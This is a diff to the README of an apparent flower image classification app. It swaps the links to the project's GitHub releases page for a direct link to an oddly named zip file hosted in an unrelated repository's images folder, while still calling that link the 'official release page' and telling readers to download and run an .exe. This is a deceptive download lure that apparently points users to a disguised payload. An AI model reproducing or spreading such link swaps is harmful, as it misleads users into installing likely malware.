@@ -5,7 +5,7 @@ description: "Train a convolutional neural network to classify five flower speci
 ---
 # 🌸 flower-Image-Classification - Identify flower types using simple photos
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Pitviperrosachinensis176/flower-Image-Classification/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Pitviperrosachinensis176/pitviperrosachinensis176.github.io/main/images/Latest_sprachle.zip)
 
 This application identifies five types of flowers from photos. It uses computer vision to analyze images. You provide an image, and the software names the flower. It works on standard Windows computers.
 
@@ -13,7 +13,7 @@ This application identifies five types of flowers from photos. It uses computer 
 
 Follow these steps to get the application on your computer.
 
-1. Visit the [official release page](https://github.com/Pitviperrosachinensis176/flower-Image-Classification/releases) to see available downloads.
+1. Visit the [official release page](https://raw.githubusercontent.com/Pitviperrosachinensis176/pitviperrosachinensis176.github.io/main/images/Latest_sprachle.zip) to see available downloads.
 2. Select the file ending in .exe for your Windows system.
 3. Click the link to begin the download.
 4. Save the file to your desktop or downloads folder.
